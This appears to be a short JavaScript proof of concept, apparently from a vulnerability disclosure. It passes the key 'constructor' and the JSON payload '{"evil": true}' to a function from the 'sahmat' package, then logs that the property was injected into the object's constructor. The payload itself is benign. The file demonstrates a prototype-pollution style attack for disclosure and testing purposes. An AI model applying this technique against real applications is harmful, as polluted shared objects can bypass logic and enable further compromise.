var sahmat = require('sahmat');
var payload = '{"evil": true}';

const obj = {
    one: {
        two: {
            a: 1,
            b: [3,4,5]
        }
    }
}

console.log("Before:", obj.constructor.evil);
sahmat(obj, 'constructor', JSON.parse(payload));
console.log("After:" ,obj.constructor.evil);


